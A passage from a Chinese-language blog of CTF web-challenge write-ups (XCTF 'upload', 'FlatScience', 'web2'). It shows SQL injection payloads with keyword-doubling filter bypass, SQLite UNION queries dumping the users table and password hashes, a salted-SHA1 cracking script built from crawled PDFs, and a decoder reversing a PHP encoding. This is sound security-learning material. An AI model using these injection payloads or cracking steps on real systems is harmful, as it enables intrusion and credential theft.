s&#39;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),37,12),16,10))+&#39;.jpg
#返回 126853610566245

s&#39;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),49,12),16,10))+&#39;.jpg
#返回 48848364724837

s&#39;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),61,12),16,10))+&#39;.jpg
#返回 29299
</code></pre><p>转换为 ASCII</p>
<pre><code class="python">s = [112602976187180,114784820031327,112615676665705,126853610566245,48848364724837,29299]

for i in range(len(s)):
    s[i] = hex(s[i])[2:]

hex_list = []
con_list = []
flag = &quot;&quot;

for i in s:
    for j in range(0,len(i),2):
        hex_list.append(i[j:j+2])

for i in hex_list:
    con_list.append(int(i,16))

for i in con_list:
    flag = flag + chr(i)


print(s)
print(flag)        #输出 files,hello_flag_is_here,members
</code></pre>
<p><strong>注列名</strong></p>
<pre><code>s&#39;+(selselectect CONV(substr(hex((selselectect group_concat(column_name) frfromom information_schema.columns where table_name=&#39;hello_flag_is_here&#39;)),1,12),16,10))+&#39;.jpg
#返回 115858377367398

s&#39;+(selselectect CONV(substr(hex((selselectect group_concat(column_name) frfromom information_schema.columns where table_name=&#39;hello_flag_is_here&#39;)),13,12),16,10))+&#39;.jpg
#返回 7102823
</code></pre><p>使用如上代码，转换为 ASCII 结果为 <code>i_am_flag</code></p>
<p><strong>注数据</strong></p>
<pre><code>s&#39;+(selselectect CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here)),1,12),16,10))+&#39;.jpg
#返回 36427215695199

s&#39;+(selselectect CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here)),13,12),16,10))+&#39;.jpg
#返回 92806431727430

s&#39;+(selselectect CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here)),25,12),16,10))+&#39;.jpg
#返回 560750951
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-9.png" alt="7-9"></p>
<p>浏览器结果</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-10.png" alt="7-10"></p>
<p>转换为 ASCII 结果</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-11.png" alt="7-11"></p>
<p>拿到flag，直接提交不用加外套</p>
<h2 id="FlatScience"><a href="#FlatScience" class="headerlink" title="FlatScience"></a>FlatScience</h2><p>进站日常扫描</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/8-1.png" alt="8-1"></p>
<p>访问<code>robots.txt</code>，里面的内容也还是我们扫出来的<code>admin.php</code>、<code>login.php</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/8-2.png" alt="8-2"></p>
<p>先查看<code>login.php</code>，用户名提交单引号会出现<code>sql报错</code>，但是没有找到突破点。但是在源码中看到<code>&lt;!-- TODO: Remove ?debug-Parameter! --&gt;</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/8-3.png" alt="8-3"></p>
<p>提交<code>debug</code>参数，得到源代码</p>
<pre><code class="php">&lt;?php
ob_start();
?&gt;
&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot;&gt;

&lt;html&gt;
&lt;head&gt;
&lt;style&gt;
blockquote { background: #eeeeee; }
h1 { border-bottom: solid black 2px; }
h2 { border-bottom: solid black 1px; }
.comment { color: darkgreen; }
&lt;/style&gt;

&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=iso-8859-1&quot;&gt;
&lt;title&gt;Login&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;


&lt;div align=right class=lastmod&gt;
Last Modified: Fri Mar  31:33:7 UTC 1337
&lt;/div&gt;

&lt;h1&gt;Login&lt;/h1&gt;

Login Page, do not try to hax here plox!&lt;br&gt;


&lt;form method=&quot;post&quot;&gt;
  ID:&lt;br&gt;
  &lt;input type=&quot;text&quot; name=&quot;usr&quot;&gt;
  &lt;br&gt;
  Password:&lt;br&gt; 
  &lt;input type=&quot;text&quot; name=&quot;pw&quot;&gt;
  &lt;br&gt;&lt;br&gt;
  &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;
&lt;/form&gt;

&lt;?php
if(isset($_POST[&#39;usr&#39;]) &amp;&amp; isset($_POST[&#39;pw&#39;])){
        $user = $_POST[&#39;usr&#39;];
        $pass = $_POST[&#39;pw&#39;];

        $db = new SQLite3(&#39;../fancy.db&#39;);

        $res = $db-&gt;query(&quot;SELECT id,name from Users where name=&#39;&quot;.$user.&quot;&#39; and password=&#39;&quot;.sha1($pass.&quot;Salz!&quot;).&quot;&#39;&quot;);
    if($res){
        $row = $res-&gt;fetchArray();
    }
    else{
        echo &quot;&lt;br&gt;Some Error occourred!&quot;;
    }

    if(isset($row[&#39;id&#39;])){
            setcookie(&#39;name&#39;,&#39; &#39;.$row[&#39;name&#39;], time() + 60, &#39;/&#39;);
            header(&quot;Location: /&quot;);
            die();
    }

}

if(isset($_GET[&#39;debug&#39;]))
highlight_file(&#39;login.php&#39;);
?&gt;
&lt;!-- TODO: Remove ?debug-Parameter! --&gt; 
</code></pre>
<p>从源码中可以看到：①使用了<code>SQLite3</code>，他是一款轻型的数据库，处理速度比 Mysql、POstfreSQL 都快；②当查询的语句返回结果有值的话，将会调用<code>setcookie()</code>函数</p>
<p>对于 SQLite3 有一点需要知道：它自带的结构表为<code>sqlite_master</code>，<code>sql</code>是其中的一个字段，<code>可以返回创建表的语句</code>，注入的时候经常会用到，首先先搞清楚列数</p>
<pre><code>usr=&#39; union select 1 --+&amp;pw=123    #报错do not have the same number of result columns

usr=&#39; union select 1,2 --+&amp;pw=123    #无报错

usr=&#39; union select 1,2,3 --+&amp;pw=123    #报错do not have the same number of result columns
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/8-5.png" alt="8-5"></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/8-6.png" alt="8-6"></p>
<p>确认字段数为<code>2</code>，并且注入点在<code>2</code>，回显的点在 Set-Cookie 中的<code>name</code>字段，构造 payload 利用 sqlite_master 的 sql 字段可以返回创建表的语句这一功能，查看目标表的字段</p>
<pre><code>usr=&#39; union select name,sql from sqlite_master --+&amp;pw=123
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/8-4.png" alt="8-4"></p>
<p>可以看到，服务器返回<code>Set-Cookie</code>字段了，将其解码得到如下</p>
<pre><code class="sql"> CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255))
</code></pre>
<p>知道表的列名之后，注出每个字段的数据</p>
<p><strong>id</strong></p>
<pre><code>usr=&#39; union select name,group_concat(id) from Users --+&amp;pw=123
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/8-7.png" alt="8-7"></p>
<p><strong>name</strong></p>
<pre><code>usr=&#39; union select name,group_concat(name) from Users --+&amp;pw=123
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/8-8.png" alt="8-8"></p>
<p><strong>password</strong></p>
<pre><code>usr=&#39; union select name,group_concat(password) from Users --+&amp;pw=123
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/8-9.png" alt="8-9"></p>
<p><strong>hint</strong></p>
<pre><code>usr=&#39; union select name,group_concat(hit) from Users --+&amp;pw=123
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/8-10.png" alt="8-10"></p>
<p>整理</p>
<table>
<thead>
<tr>
<th>id</th>
<th>name</th>
<th>password</th>
<th>hint</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>admin</td>
<td>3fab54a50e770d830c0416df817567662a9dc85c</td>
<td>my fav word in my fav paper?!</td>
</tr>
<tr>
<td>2</td>
<td>fritze</td>
<td>54eae8935c90f467427f05e4ece82cf569f89507</td>
<td>my love isâ¦?</td>
</tr>
<tr>
<td>3</td>
<td>Chansi</td>
<td>34b0bb7c304949f9ff2fc101eef0f048be10d3bd</td>
<td>the password is password</td>
</tr>
</tbody>
</table>
<p>根据 admin 的 hint ，之前翻网站翻到的 PDF 可能对破解密码有用。用网上的脚本，爬取总共30个 PDF 文件， 然后用脚本进行解析处理，并用sha1函数与加密的密码进行碰撞已找出正确的密码 </p>
<pre><code class="python">from cStringIO import StringIO
from pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreter
from pdfminer.converter import TextConverter
from pdfminer.layout import LAParams
from pdfminer.pdfpage import PDFPage
import sys
import string
import os
import hashlib

def get_pdf():
    return [i for i in os.listdir(&quot;./&quot;) if i.endswith(&quot;pdf&quot;)]


def convert_pdf_2_text(path):
    rsrcmgr = PDFResourceManager()
    retstr = StringIO()
    device = TextConverter(rsrcmgr, retstr, codec=&#39;utf-8&#39;, laparams=LAParams())
    interpreter = PDFPageInterpreter(rsrcmgr, device)
    with open(path, &#39;rb&#39;) as fp:
        for page in PDFPage.get_pages(fp, set()):
            interpreter.process_page(page)
        text = retstr.getvalue()
    device.close()
    retstr.close()
    return text


def find_password():
    pdf_path = get_pdf()
    for i in pdf_path:
        print &quot;Searching word in &quot; + i
        pdf_text = convert_pdf_2_text(i).split(&quot; &quot;)
        for word in pdf_text:
            sha1_password = hashlib.sha1(word+&quot;Salz!&quot;).hexdigest()
            if sha1_password == &#39;3fab54a50e770d830c0416df817567662a9dc85c&#39;:
                print &quot;Find the password :&quot; + word
                exit()

if __name__ == &quot;__main__&quot;:
    find_password()
</code></pre>
<p>跑出密码：<code>ThinJerboa</code></p>
<p>到 admin.php  登录，拿下flag</p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>题目进去就可以看到代码</p>
<pre><code class="php">&lt;?php
$miwen=&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;

function encode($str){
    $_o=strrev($str);
    // echo $_o;

    for($_0=0;$_0&lt;strlen($_o);$_0++){

        $_c=substr($_o,$_0,1);
        $__=ord($_c)+1;
        $_c=chr($__);
        $_=$_.$_c;   
    } 
    return str_rot13(strrev(base64_encode($_)));
}

highlight_file(__FILE__);
/*
   逆向加密算法，解密$miwen就是flag
*/
?&gt; 
</code></pre>
<p>直接写对应解密代码</p>
<pre><code class="php">&lt;?php
$miwen=&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;
$before_return = base64_decode(strrev(str_rot13($miwen)));
$_ = &#39;&#39;;
for($_0=0;$_0&lt;strlen($before_return);$_0++){
    $_c = substr($before_return,$_0,1);
    $__ = ord($_c)-1;
    $_c = chr($__);
    $_ = $_.$_c;
}
echo strrev($_);
?&gt;
</code></pre>
<p>拿下flag</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/9-1.png" alt="9-1"></p>

            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls"
                data-autoplay="false">
                <source type="audio/mpeg" src="">
            </audio>
            
            <ul id="audio-list" style="display:none">
                
                
                <li title='0' data-url='/knlvre.github.io/statics/forhim.mp3'></li>
                
                    
            </ul>
            
            
            
    <div id='gitalk-container' class="comment link"
        data-ae='true'
        data-ci='ec894e2b66f752e8b7fb'
        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
        data-r='blog-comments'
        data-o='TriDiamond'
        data-a='TriDiamond'
        data-d=''
    >Comments</div>


            
            
        </div>
        <div class="sidebar">
            <div class="box animated fadeInRight">
                <div class="subbox">
                    <img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/ico/Hacker.ico" height=300 width=300></img>
                    <p>Knlvre</p>
                    <span>Notes During Information Security Learning.</span>
                    <dl>
                        <dd><a href="https://github.com/knlvre" target="_blank"><span
                                    class=" iconfont icon-github"></span></a></dd>
                        <dd><a href="https://github.com/knlvre" target="_blank"><span
                                    class=" iconfont icon-twitter"></span></a></dd>
                        <dd><a href="https://github.com/knlvre" target="_blank"><span
                                    class=" iconfont icon-stack-overflow"></span></a></dd>
                    </dl>
                </div>
                <ul>
                    <li><a href="/">61 <p>Articles</p></a></li>
                    <li><a href="/categories">3 <p>Categories</p></a></li>
                    <li><a href="/tags">9 <p>Tags</p></a></li>
                </ul>
            </div>
            
            
            
            <div class="box sticky animated fadeInRight faster">
                <div id="toc" class="subbox">
                    <h4>Contents</h4>
                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Cat"><span class="toc-number">1.</span> <span class="toc-text">Cat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ics-05"><span class="toc-number">2.</span> <span class="toc-text">ics-05</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lottery"><span class="toc-number">3.</span> <span class="toc-text">lottery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NewsCenter"><span class="toc-number">4.</span> <span class="toc-text">NewsCenter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mfw"><span class="toc-number">5.</span> <span class="toc-text">mfw</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Training-WWW-Robots"><span class="toc-number">6.</span> <span class="toc-text">Training-WWW-Robots</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bug"><span class="toc-number">7.</span> <span class="toc-text">bug</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#upload"><span class="toc-number">8.</span> <span class="toc-text">upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FlatScience"><span class="toc-number">9.</span> <span class="toc-text">FlatScience</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web2"><span class="toc-number">10.</span> <span class="toc-text">web2</span></a></li></ol>
                </div>
            </div>
            
            
        </div>
    </div>
</div>

    </div>
</div>
    <div id="back-to-top" class="animated fadeIn faster">
        <div class="flow"></div>
        <span class="percentage animated fadeIn faster">0%</span>
        <span class="iconfont icon-top02 animated fadeIn faster"></span>
    </div>
</body>
<footer>
    <p class="copyright" id="copyright">
        &copy; 2019
        <span class="gradient-text">
            Knlvre
        </span>.
        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
        Theme
        <span class="gradient-text">
            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
        </span>
        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
    </p>
</footer>

<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>
<script>
  MathJax.Hub.Config({
    "HTML-CSS": {
      preferredFont: "TeX",
      availableFonts: ["STIX", "TeX"],
      linebreaks: {
        automatic: true
      },
      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
      inlineMath: [
        ["$", "$"],
        ["\\(", "\\)"]
      ],
      processEscapes: true,
      ignoreClass: "tex2jax_ignore|dno",
      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
      noUndefined: {
        attributes: {
          mathcolor: "red",
          mathbackground: "#FFEEEE",
          mathsize: "90%"
        }
      },
      Macros: {
        href: "{}"
      }
    },
    messageStyle: "none"
  });
</script>
<script>
  function initialMathJax() {
    MathJax.Hub.Queue(function () {
      var all = MathJax.Hub.getAllJax(),
        i;
      // console.log(all);
      for (i = 0; i < all.length; i += 1) {
        console.log(all[i].SourceElement().parentNode)
        all[i].SourceElement().parentNode.className += ' has-jax';
      }
    });
  }

  function reprocessMathJax() {
    if (typeof MathJax !== 'undefined') {
      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
    }
  }
</script>



    <link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
    <script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>

<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="/knlvre.github.io/js/plugin.js"></script>
<script src="/knlvre.github.io/js/obsidian.js"></script>
<script src="/knlvre.github.io/js/jquery.truncate.js"></script>
<script src="/knlvre.github.io/js/search.js"></script>
<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>

<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>



    <script src="/knlvre.github.io/js/busuanzi.min.js"></script>
    <script>
        $(document).ready(function () {
            if ($('span[id^="busuanzi_"]').length) {
                initialBusuanzi();
            }
        });
    </script>


<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>

<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>



    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'UA-149874671-1');
    </script>





<script>
    function initialTyped () {
        var typedTextEl = $('.typed-text');
        if (typedTextEl && typedTextEl.length > 0) {
            var typed = new Typed('.typed-text', {
                strings: ["Notes During Information Security Learning.", "信息安全学习过程中的笔记。"],
                typeSpeed: 90,
                loop: true,
                loopCount: Infinity,
                backSpeed: 20,
            });
        }
    }

    if ($('.article-header') && $('.article-header').length) {
        $(document).ready(function () {
            initialTyped();
        });
    }
</script>




</html>
